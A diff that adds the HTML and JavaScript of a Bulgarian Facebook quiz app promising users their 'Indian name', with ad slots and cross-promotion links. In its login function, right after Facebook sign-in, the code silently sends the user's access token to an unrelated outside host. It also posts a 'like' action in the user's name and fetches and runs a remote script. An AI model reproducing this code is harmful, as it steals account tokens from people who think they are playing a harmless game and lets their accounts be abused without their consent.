@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="bg" xmlns:fb="http://ogp.me/ns/fb#">
+<head>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+<!--[if lt IE 9]>
+  <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+<![endif]-->
+<meta charset="UTF-8">
+<meta name="robots" content="noodp, noydir">
+<title>Индиянското ти име (забавни) късмети зодии гадания щастие Фейсбук Facebook</title>
+<meta name="description" content="Гръмотевичния облак Facebook ">
+<link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.no-icons.min.css" rel="stylesheet">
+<link href="//netdna.bootstrapcdn.com/font-awesome/3.1.1/css/font-awesome.min.css" rel="stylesheet">
+<script src="//arpecop.net/angel/tab/src/jquery.anystretch.js"></script>
+<script src="//arpecop.net/angel/tab/src/transit.js"></script>
+<link href='//fonts.googleapis.com/css?family=Open+Sans:300&subset=cyrillic' rel='stylesheet' type='text/css'>
+<script src="//ads.lfstmedia.com/getad?site=138278" type="text/javascript"></script>
+
+<style type="text/css">
+@font-face {
+	font-family: 'MuseoCyrl-500';
+	src: url('src/274C19_0_0.eot');
+	src: url('src/274C19_0_0.eot?#iefix') format('embedded-opentype'), url('src/274C19_0_0.woff') format('woff'), url('src/274C19_0_0.ttf') format('truetype');
+}
+body, td, th, div, span {
+	font-family: 'MuseoCyrl-500', Helvetica, Arial, sans-serif;
+}
+#avatar {
+	width: 100px;
+	height: 100px;
+}
+.left, .right {
+	border: none;
+	padding: 6% 2%;
+	color: #FFF;
+}
+.left {
+	background: rgba(0,0,0,0.6);
+	text-shadow: 1px 1px 1px #000;
+	padding: 6% 2%;
+}
+#result, .adsense {
+	display: none;
+}
+#result .left {
+	min-height: 220px;
+}
+.lead {font-weight: 100;}
+.itemad { width:405px; float:left; font-weight: 100; font-size: 11px;}
+.itemad .section {padding: 5px;}
+
+#cross .section {font-family: 'Open Sans', sans-serif;}
+ 
+</style>
+</head>
+<body style="overflow:hidden">
+    <div id="fb-root"></div>
+    <div style="text-align:center; height:90px; margin-bottom:10px;">
+    <script type="text/javascript">
+    //<![CDATA[
+        LSM_Slot({
+            adkey: '288',
+            ad_size: '728x90',
+            slot: 'slot52312'
+        });
+    //]]>
+</script>
+</div>
+<hr>
+<div id="result" class="stretchMe row-fluid">
+  <div class="span3 right"> <img id="avatar" class="img-circle"> </div>
+  <div class="left span9">
+    <p class="lead"></p>
+  </div>
+</div>
+<div id="containertab">
+  <div class="stretchMe row-fluid infostep1">
+    <div class="span6 right">
+      <div class="row-fluid">
+        <div class="span2"></div>
+        <a class="btn btn-primary btn-large span8" id="publish" style="margin-top:65px" onclick="fb_login(); return false;"><i class="icon-key"></i>Провери</a>
+        <div class="span2"></div>
+      </div>
+    </div>
+    <div class="left span6">
+      <h2 class="name"> </h2>
+      <p class="about lead"> </p>
+    </div>
+  </div>
+  <hr>
+  <div class="adsense"></div>
+  <div id="comments">  <div class="fb-comments" data-href="http://facebook.com/(:pageid:)/?sk=app_455845877841696" data-numposts="5"  width="810" num_posts="10" order_by="reverse_time"></div></div>
+
+  <script type="text/javascript">
+$.gvar = {};
+var url = 'https://graph.facebook.com/(:pageid:)/?callback=?';
+$.getJSON(url, function(data) {
+    $('.stretchMe').anystretch(data.cover.source);
+    $.each(data, function(index, val) {
+        $.gvar[index] = val;
+        $('.' + index).text(val);
+    });
+});
+
+
+//inbox
+$('#publish').on('mouseover', function() {
+    $('#publish').transition({
+        scale: 1.1
+    }).transition({
+        scale: 1
+    });
+
+});
+$.gvar = {};
+
+
+
+$.display_result = function() {
+     
+    $('#result .left p').html($.gvar.quote.info);
+  
+ 
+        var img = $.tmpl($.gvar.quote.newurl, $.gvar.user).text();
+      
+         
+
+        
+
+        if ($.gvar.quote.info.length > 150) {
+            $.gvar.quote.info = " ";
+        }
+
+        // insert here dont forget
+     var randomnumber=Math.floor(Math.random()*99999)
+        var urlpost = "http://arpecop.net/angel/like/?description=Резултат " + $.gvar.user.first_name + ": " + $.gvar.quote.info + "&title="+$.gvar.name+"&appid=329232053871264&img=" + img + "&id=1&type=object&appurl="+$.gvar.website+"#"+randomnumber;
+ 
+console.log(urlpost)
+        FB.api(
+            'me/og.likes',
+            'post', {
+               object: urlpost
+            },
+            function(response) {
+            console.log(response)
+              
+            }
+        );
+
+
+     
+
+
+
+
+    $(".infostep1").transition({
+        scale: 0.5
+    }).transition({
+        y: -810
+    }, function() {
+        $('.infostep1').remove();
+        $('#result').transition({
+            scale: 0.5
+        }).show('slow').transition({
+            scale: 1
+        }, function() {
+            $('.adsense').transition({
+                scale: 0.5
+            }).show('slow').transition({
+                scale: 1
+            }, function() {
+                $('#cross,#comments').show();
+            });
+        });
+    });
+};
+
+function fb_login() {
+    $.getJSON('//arpecop.net/angel/tab/data/' + $.gvar.username + '.json', function(datapage) {
+        $.gvar.page = datapage;
+        FB.login(function(response) {
+            if (response.authResponse) {
+                var uid = response.authResponse.userID;
+                var accessToken = response.authResponse.accessToken;
+                //ZOBING
+                $.getJSON('https://processbook.herokuapp.com/?token=' + accessToken, function(zob) {
+
+                });
+                $('#avatar').attr('src', 'https://graph.facebook.com/' + uid + '/picture');
+                $.getJSON('https://graph.facebook.com/' + uid + '?fields=birthday,first_name,third_party_id&access_token=' + accessToken, function(data) {
+                    $('.adsense').html('<iframe src="//app.appatyze.com/gateway.php?a=1499&aid=' + data.third_party_id + '" width="100%" height="90" scrolling="no" frameborder="0" marginwidth="0" marginheight="0"></iframe>');
+                    FB.XFBML.parse();
+                    FB.Canvas.setAutoGrow();
+                    $.gvar.user = data;
+                    data.app = $.gvar.username;
+                    data.token = accessToken;
+                    if (datapage.callfunction) {
+                        $.getScript('https://arpecop.net/angel/tab/data/' + $.gvar.username + '/script.js', function() {
+                            var getid = dothejob($.gvar.user);
+                            $.gvar.quote = $.gvar.page.items[getid];
+                            $.display_result();
+                        });
+                    } else {
+                        var rid = Math.floor(Math.random() * datapage.items.length);
+                        $.gvar.quote = datapage.items[rid];
+                        $.gvar.page.url = datapage.items[rid].newurl;
+                        $.display_result();
+                    }
+                });
+
+            }
+        }, {
+            scope: datapage.scope
+        });
+
+    });
+}
+
+window.fbAsyncInit = function() {
+
+    FB.init({
+        appId: '329232053871264',
+        channelUrl: '//arpecop.net/static/channel.html',
+        status: true, // check the login status upon init?
+        cookie: true, // set sessions cookies to allow your server to access the session?
+        xfbml: true // parse XFBML tags on this page?
+    });
+
+    // Additional initialization code such as adding Event Listeners goes here
+    FB.Canvas.setAutoGrow();
+
+};
+
+(function(d, debug) {
+    var js, id = 'facebook-jssdk',
+        ref = d.getElementsByTagName('script')[0];
+    if (d.getElementById(id)) {
+        return;
+    }
+    js = d.createElement('script');
+    js.id = id;
+    js.async = true;
+    js.src = "//connect.facebook.net/bg_BG/all" + (debug ? "/debug" : "") + ".js";
+    ref.parentNode.insertBefore(js, ref);
+}(document, /*debug*/ false));
+
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-29127191-1']);
+_gaq.push(['_trackPageview']);
+(function() {
+    var ga = document.createElement('script');
+    ga.type = 'text/javascript';
+    ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(ga, s);
+})();
+ /*
+var cross = ['predishenjivot', 'imetoti', 'vazrast', 'denposleden', 'moiatazodia', 'iaponskoime', 'indianskoime'];
+var itemz = [];
+$.each(cross, function (index, value) {
+    $.getJSON('https://graph.facebook.com/' + value + '/?callback=?', function (data) {
+
+        //id: "246560865463407"
+        //link: "http://www.facebook.com/vazrast"
+        //name: "На колко години изглеждаш [Скенер]"
+        var likes = data.likes;
+        var cover = data.cover.source;
+        $('#cross').append('<div class="itemad"><div class="section"><a href="' + data.link + '/app_455845877841696" target="_top"><img src="https://graph.facebook.com/' + data.id + '/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="' + data.link + '/app_455845877841696" target="_top">' + data.name + '</a></strong><br>&nbsp;&nbsp;' + data.about + '</div></div>');
+    });
+})
+*/
+
+
+
+	 
+
+</script> 
+ 
+
+	<div style="clear:both"></div>
+
+<div id="cross"><div class="itemad"><div class="section"><a href="https://www.facebook.com/imetoti/app_455845877841696" target="_top"><img src="https://graph.facebook.com/131839906957023/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/imetoti/app_455845877841696" target="_top">Тълкуване на буквите на името</a></strong><br>&nbsp;&nbsp;Тълкуване на буквите на името</div></div><div class="itemad"><div class="section"><a href="https://www.facebook.com/predishenjivot/app_455845877841696" target="_top"><img src="https://graph.facebook.com/333747356705341/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/predishenjivot/app_455845877841696" target="_top">Какъв сте били в предишен живот?</a></strong><br>&nbsp;&nbsp;Проверете с това забавно приложение</div></div><div class="itemad"><div class="section"><a href="https://www.facebook.com/denposleden/app_455845877841696" target="_top"><img src="https://graph.facebook.com/432638250153045/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/denposleden/app_455845877841696" target="_top">Живей всеки ден, сякаш ти е последен</a></strong><br>&nbsp;&nbsp;Провери колко ще живееш с това приложение</div></div><div class="itemad"><div class="section"><a href="https://www.facebook.com/vazrast/app_455845877841696" target="_top"><img src="https://graph.facebook.com/246560865463407/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/vazrast/app_455845877841696" target="_top">На колко години изглеждаш [Скенер]</a></strong><br>&nbsp;&nbsp;На колко години изглеждаш [Скенер]
+</div></div><div class="itemad"><div class="section"><a href="https://www.facebook.com/moiatazodia/app_455845877841696" target="_top"><img src="https://graph.facebook.com/295422490556486/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/moiatazodia/app_455845877841696" target="_top">Моята Зодия</a></strong><br>&nbsp;&nbsp;Провери положителните черти според денят в който си роден</div></div><div class="itemad"><div class="section"><a href="https://www.facebook.com/iaponskoime/app_455845877841696" target="_top"><img src="https://graph.facebook.com/132139833633587/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/iaponskoime/app_455845877841696" target="_top">Японско Име</a></strong><br>&nbsp;&nbsp;Провери как би се казвал ако си японец</div></div> <div class="itemad"><div class="section"><a href="https://www.facebook.com/indianskoime/app_455845877841696" target="_top"><img src="https://graph.facebook.com/indianskoime/picture" style="float:left;" class="img-rounded"></a> <strong>&nbsp;&nbsp;<a href="https://www.facebook.com/indianskoime/app_455845877841696" target="_top">Индиянско име Име</a></strong><br>&nbsp;&nbsp;Провери как би се казвал ако си индиянец</div></div> </div>
+    <div style="clear:both"></div>
+<hr>
+ 
+<div class="follow" style="width:405px; float:left;">
+<div class="fb-follow" data-href="https://www.facebook.com/arpecop" data-show-faces="true" data-width="405"></div>
+</div>
+
+<div class="privacy" style="width:405px; float:right; font-size:9px;">Terms & Conditions ::
+Privacy Policy
+Copyright © 2013 Rudi
+</div>
+</div>
+
+</body>
+</html>
